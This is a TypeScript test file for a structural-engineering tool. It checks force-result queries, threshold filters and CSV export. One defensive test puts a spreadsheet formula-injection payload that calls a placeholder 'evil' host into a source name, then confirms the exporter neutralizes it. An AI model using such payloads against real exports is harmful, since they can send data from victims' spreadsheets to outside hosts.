import { describe, it, expect } from 'vitest';
import type { ElementForces3D } from '../types-3d';
import {
  buildQueryRows,
  extremeRow,
  filterByAbsThreshold,
  componentEnds,
  diagramTypeToComponent,
  rowsToCsv,
  type QueryExportMeta,
} from '../result-query';

const META: QueryExportMeta = {
  sourceKind: 'envelope',
  sourceId: null,
  sourceName: 'Envolvente',
  scopeMode: 'all',
  scopeIds: [],
  threshold: 0,
  extremeMode: 'absmax',
};

/** Minimal ElementForces3D factory — only the fields the query layer reads. */
function ef(elementId: number, vals: Partial<ElementForces3D> = {}): ElementForces3D {
  return {
    elementId,
    length: 1,
    nStart: 0, nEnd: 0,
    vyStart: 0, vyEnd: 0,
    vzStart: 0, vzEnd: 0,
    mxStart: 0, mxEnd: 0,
    myStart: 0, myEnd: 0,
    mzStart: 0, mzEnd: 0,
    releaseMyStart: false, releaseMyEnd: false,
    releaseMzStart: false, releaseMzEnd: false,
    releaseTStart: false, releaseTEnd: false,
    qYI: 0, qYJ: 0, distributedLoadsY: [], pointLoadsY: [],
    qZI: 0, qZJ: 0, distributedLoadsZ: [], pointLoadsZ: [],
    ...vals,
  };
}

describe('result-query: extremes by component', () => {
  const forces = [
    ef(1, { mzStart: 10, mzEnd: -40 }),
    ef(2, { mzStart: 25, mzEnd: -15 }),
    ef(3, { mzStart: 5, mzEnd: 5 }),
  ];

  it('absmax picks the largest magnitude regardless of sign', () => {
    const rows = buildQueryRows(forces, 'Mz');
    const top = extremeRow(rows, 'absmax');
    expect(top).toMatchObject({ elementId: 1, end: 'j', value: -40 });
  });

  it('max picks the largest signed value', () => {
    const rows = buildQueryRows(forces, 'Mz');
    const top = extremeRow(rows, 'max');
    expect(top).toMatchObject({ elementId: 2, end: 'i', value: 25 });
  });

  it('min picks the smallest signed value', () => {
    const rows = buildQueryRows(forces, 'Mz');
    const top = extremeRow(rows, 'min');
    expect(top).toMatchObject({ elementId: 1, end: 'j', value: -40 });
  });

  it('componentEnds maps each component to the right fields', () => {
    const e = ef(7, { nStart: 1, nEnd: 2, vyStart: 3, vzStart: 4, mxStart: 5, myStart: 6, mzStart: 7 });
    expect(componentEnds(e, 'N')).toEqual({ i: 1, j: 2 });
    expect(componentEnds(e, 'Vy').i).toBe(3);
    expect(componentEnds(e, 'Vz').i).toBe(4);
    expect(componentEnds(e, 'T').i).toBe(5);
    expect(componentEnds(e, 'My').i).toBe(6);
    expect(componentEnds(e, 'Mz').i).toBe(7);
  });

  it('restricts to requested element ids, in order, skipping unknown ids', () => {
    const rows = buildQueryRows(forces, 'Mz', { elementIds: [3, 99, 1] });
    expect(rows.map((r) => r.elementId)).toEqual([3, 3, 1, 1]);
  });
});

describe('result-query: threshold filter predicate', () => {
  const rows = buildQueryRows(
    [ef(1, { vyStart: 8, vyEnd: -50 }), ef(2, { vyStart: 30, vyEnd: 0 })],
    'Vy',
  );

  it('keeps only rows at or above the abs threshold', () => {
    const filtered = filterByAbsThreshold(rows, 30);
    expect(filtered.map((r) => Math.abs(r.value)).sort((a, b) => a - b)).toEqual([30, 50]);
  });

  it('is inclusive at the threshold boundary', () => {
    expect(filterByAbsThreshold(rows, 50)).toHaveLength(1);
  });

  it('a zero/negative threshold is a no-op (returns all rows)', () => {
    expect(filterByAbsThreshold(rows, 0)).toHaveLength(rows.length);
    expect(filterByAbsThreshold(rows, -5)).toHaveLength(rows.length);
  });
});

describe('result-query: empty / no-results behavior', () => {
  it('buildQueryRows on no forces is empty', () => {
    expect(buildQueryRows([], 'Mz')).toEqual([]);
  });

  it('extremeRow on empty rows is null', () => {
    expect(extremeRow([], 'absmax')).toBeNull();
    expect(extremeRow(buildQueryRows([], 'N'))).toBeNull();
  });

  it('CSV builders emit a header-only document when there are no rows', () => {
    expect(rowsToCsv([], META).split('\n')).toHaveLength(1);
  });
});

describe('result-query: diagram type → component', () => {
  it('maps each force diagram type to its component', () => {
    expect(diagramTypeToComponent('axial')).toBe('N');
    expect(diagramTypeToComponent('shearY')).toBe('Vy');
    expect(diagramTypeToComponent('shearZ')).toBe('Vz');
    expect(diagramTypeToComponent('torsion')).toBe('T');
    expect(diagramTypeToComponent('momentY')).toBe('My');
    expect(diagramTypeToComponent('momentZ')).toBe('Mz');
  });

  it('returns null for non-force diagrams (no silent fallback)', () => {
    for (const dt of ['none', 'deformed', 'colorMap', 'axialColor', 'verification', 'modeShape']) {
      expect(diagramTypeToComponent(dt)).toBeNull();
    }
  });
});

describe('result-query: flat CSV serialization with metadata', () => {
  const HEADER = 'sourceKind,sourceId,sourceName,component,scopeMode,scopeIds,threshold,extremeMode,element,end,value,unit';

  it('rowsToCsv: header + one flat row per query row, metadata repeated', () => {
    const rows = buildQueryRows([ef(1, { mzStart: 10, mzEnd: -40 })], 'Mz');
    const meta: QueryExportMeta = {
      sourceKind: 'combo', sourceId: 3, sourceName: 'U2: 1.2D + 1.6L',
      scopeMode: 'id', scopeIds: [1, 4], threshold: 5, extremeMode: 'absmax',
    };
    const lines = rowsToCsv(rows, meta).split('\n');
    expect(lines[0]).toBe(HEADER);
    expect(lines).toHaveLength(3);
    // every row carries the full source + query metadata
    expect(lines[1]).toBe('combo,3,U2: 1.2D + 1.6L,Mz,id,1 4,5,absmax,1,i,10,kN·m');
    expect(lines[2]).toBe('combo,3,U2: 1.2D + 1.6L,Mz,id,1 4,5,absmax,1,j,-40,kN·m');
  });

  it('quotes a source name containing a comma', () => {
    const rows = buildQueryRows([ef(1, { nStart: 5, nEnd: 5 })], 'N');
    const meta: QueryExportMeta = { ...META, sourceKind: 'combo', sourceId: 9, sourceName: 'U9: D, L, W' };
    expect(rowsToCsv(rows, meta)).toContain('combo,9,"U9: D, L, W",N,');
  });

  it('envelope/case sourceId is blank when null', () => {
    const rows = buildQueryRows([ef(7, { nStart: 5, nEnd: 5 })], 'N');
    const row = rowsToCsv(rows, META).split('\n')[1];
    expect(row).toBe('envelope,,Envolvente,N,all,,0,absmax,7,i,5,kN');
  });

  it('neutralizes spreadsheet formula prefixes in user-controlled string cells', () => {
    const rows = buildQueryRows([ef(1, { nStart: -5, nEnd: 5 })], 'N');
    const meta: QueryExportMeta = { ...META, sourceKind: 'combo', sourceId: 9, sourceName: '=WEBSERVICE("http://evil/")' };
    const csv = rowsToCsv(rows, meta);
    // formula prefix is neutralized with a leading apostrophe…
    expect(csv).toContain("'=WEBSERVICE");
    expect(csv).not.toContain(',=WEBSERVICE');
    // …while negative NUMERIC values are untouched
    expect(csv.split('\n')[1]).toContain(',-5,');
  });
});
